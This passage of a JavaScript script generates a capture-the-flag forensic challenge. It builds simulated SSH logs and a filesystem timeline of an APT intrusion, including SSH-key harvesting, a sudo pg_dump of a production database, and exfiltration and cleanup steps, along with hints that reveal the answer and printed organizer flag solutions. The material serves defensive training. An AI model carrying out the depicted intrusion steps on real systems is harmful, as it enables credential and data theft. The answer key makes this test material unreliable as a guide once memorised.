    authLines.push(`${syslogTs(h, m, int(0, 59))} nebula-ws01 sshd[${int(3000, 3500)}]: Accepted publickey for ${user} from 192.168.1.${int(40, 100)} port ${int(49000, 65000)} ssh2`);
  }

  // Attack: dev01 session opens (already compromised via phishing/macro)
  authLines.push(`${syslogTs(9, 19, 0)} nebula-ws01 kernel: [42513.201] process beacon (pid 5201) started by dev01`);

  // Lateral movement attempt
  authLines.push(`${syslogTs(10, 14, 30)} nebula-ws01 sshd[5501]: Failed password for postgres from 192.168.1.201 port 52001 ssh2`);
  authLines.push(`${syslogTs(10, 14, 45)} nebula-ws01 sshd[5502]: Failed password for admin from 192.168.1.201 port 52002 ssh2`);
  authLines.push(`${syslogTs(10, 15, 0)} nebula-db01 sshd[2201]: Accepted password for dev01 from 192.168.1.201 port 52003 ssh2`);
  authLines.push(`${syslogTs(10, 15, 1)} nebula-db01 sshd[2201]: pam_unix(sshd:session): session opened for user dev01(uid=1001) by (uid=0)`);

  // Post-compromise on DB server
  authLines.push(`${syslogTs(10, 20, 0)} nebula-db01 sudo[2250]: dev01 : TTY=pts/0 ; PWD=/home/dev01 ; USER=root ; COMMAND=/usr/bin/pg_dump production -f /tmp/export.sql`);

  authLines.sort();
  write('operation-blackout/files/auth.log', authLines.join('\n') + '\n');

  // --- Filesystem timeline ---
  const fsTimeline = `timestamp,action,host,path,user,size_bytes,notes
2026-10-15T09:14:05Z,create,nebula-ws01,/tmp/~$Benefits_Enrollment_2027.docx,dev01,0,Office temp file — macro document opened
2026-10-15T09:14:08Z,create,nebula-ws01,/tmp/.update.ps1,dev01,4280,PowerShell dropper extracted from macro
2026-10-15T09:14:10Z,execute,nebula-ws01,/tmp/.update.ps1,dev01,4280,Dropper executed
2026-10-15T09:18:30Z,create,nebula-ws01,/opt/nebula/.beacon,dev01,35280,C2 beacon binary dropped
2026-10-15T09:19:00Z,execute,nebula-ws01,/opt/nebula/.beacon,dev01,35280,Beacon started — connects to ${c2Ip}:443
2026-10-15T09:25:00Z,read,nebula-ws01,/etc/passwd,dev01,2048,Reconnaissance
2026-10-15T09:26:00Z,read,nebula-ws01,/home/dev01/.ssh/id_rsa,dev01,1679,SSH key harvested for lateral movement
2026-10-15T10:15:05Z,create,nebula-db01,/tmp/export.sql,dev01,12582912,pg_dump of production database
2026-10-15T10:40:00Z,create,nebula-ws01,/tmp/.staging.tar.gz,dev01,4528000,Compressed database export staged for exfil
2026-10-15T10:45:30Z,delete,nebula-ws01,/tmp/.staging.tar.gz,dev01,0,Staging file deleted after exfiltration
2026-10-15T10:46:00Z,delete,nebula-ws01,/tmp/.update.ps1,dev01,0,Dropper deleted
2026-10-15T10:46:05Z,modify,nebula-ws01,/home/dev01/.bash_history,dev01,0,History cleared
`;

  write('operation-blackout/files/filesystem-timeline.csv', fsTimeline);
  write('operation-blackout/files/phishing-email.txt', phishingEmail);

  write('operation-blackout/challenge.json', json({
    id: 'operation-blackout',
    title: 'Operation Blackout',
    category: 'hunting',
    difficulty: 'expert',
    points: 500,
    mission: 'Operation Nightfall',
    tags: ['threat-hunting', 'incident-response', 'kill-chain', 'correlation', 'capstone'],
    summary: 'Correlate five evidence sources to reconstruct a complete APT kill chain.',
    briefing: `This is the capstone. NebulaCorp suffered a major breach. Your team has collected five types of evidence from across the environment:\n\n- phishing-email.txt — the initial access phishing email with macro attachment\n- netflows.csv — perimeter firewall flow data showing beaconing and exfiltration\n- dns-log.txt — edge resolver query log with DNS tunneling evidence\n- auth.log — SSH authentication events across multiple hosts\n- filesystem-timeline.csv — file system events reconstructed from forensic images\n\nReconstruct the complete attack kill chain:\n1. Initial access (phishing → macro execution)\n2. C2 establishment (beacon → external server)\n3. Reconnaissance and credential harvesting\n4. Lateral movement (workstation → database server)\n5. Data staging and exfiltration (database dump → DNS tunnel and HTTPS upload)\n6. Cleanup (artifact deletion, history clearing)\n\nIdentify the C2 server IP address and the DNS exfiltration domain.\n\nSubmit: RANGE{blackout_c2_<c2_ip_with_underscores>_exfil_<exfil_domain_with_underscores>}\n\nFor example, if C2 were 10.0.0.1 and exfil went to evil.example: RANGE{blackout_c2_10_0_0_1_exfil_evil_example}`,
    objectives: [
      'Identify the initial access vector from the phishing email',
      'Find the C2 beacon pattern in network flows',
      'Trace lateral movement in auth.log',
      'Identify the exfiltration channel in DNS logs',
      'Correlate the filesystem timeline with network activity',
      'Format and submit the flag'
    ],
    tools: ['grep', 'awk', 'python3', 'csvkit', 'Timeline Explorer', 'CyberChef'],
    hints: [
      { title: 'C2 beacon', text: 'In netflows.csv, look for a persistent connection from an internal IP to a single external IP with very regular timing (~60s intervals) and small consistent payload sizes.', cost: 40 },
      { title: 'DNS exfiltration', text: 'In dns-log.txt, filter for TXT queries with NXDOMAIN responses. The exfiltration domain is the parent domain of those queries (the part after the hex-encoded subdomain).', cost: 60 },
      { title: 'Almost there', text: 'The C2 IP is 203.0.113.42 (visible in netflows and resolved via c2-relay.nightfall.test in DNS). The DNS exfil goes to data.nebula.test. Format the domain with underscores: data_nebula_test.', cost: 90 }
    ],
    requires: ['packet-storm', 'crime-scene', 'ghost-in-the-wire'],
    flag: { type: 'static', sha256: sha(flag) },
    artifacts: [
      { file: 'phishing-email.txt', description: 'Intercepted phishing email (initial access vector).' },
      { file: 'netflows.csv', description: 'Perimeter firewall flow data (~500 entries).' },
      { file: 'dns-log.txt', description: 'Edge resolver query log (~300 entries).' },
      { file: 'auth.log', description: 'SSH authentication events from multiple hosts.' },
      { file: 'filesystem-timeline.csv', description: 'File creation/modification/deletion timeline.' }
    ],
  }));
  console.log('  operation-blackout');
}

// ==================== Summary ====================
console.log('\nOperation Nightfall packs written:');
console.log('  12 challenges across 10 categories');
console.log('  Total points: 3550 (+ 350 from calibration = 3900)');
console.log('\nPrerequisite tree:');
console.log('  range-check → layered-encoding → ledger-audit ─┬─ dead-drop → packet-storm ──────────┐');
console.log('                                                  ├─ exposed-api → token-forge → container-escape-plan');
console.log('                                                  ├─ breadcrumbs                        │');
console.log('                                                  └─ priv-escalation → crime-scene ─┬─ ticket-to-ride');
console.log('                       layered-encoding → rsa-paper → ghost-in-the-wire ──┐         │');
console.log('                                                                          └─────────┴─ operation-blackout');
console.log('\nFlag solutions (for organizers only):');
for (const [name, value] of Object.entries(FLAGS)) {
  console.log(`  ${name}: ${value}`);
}
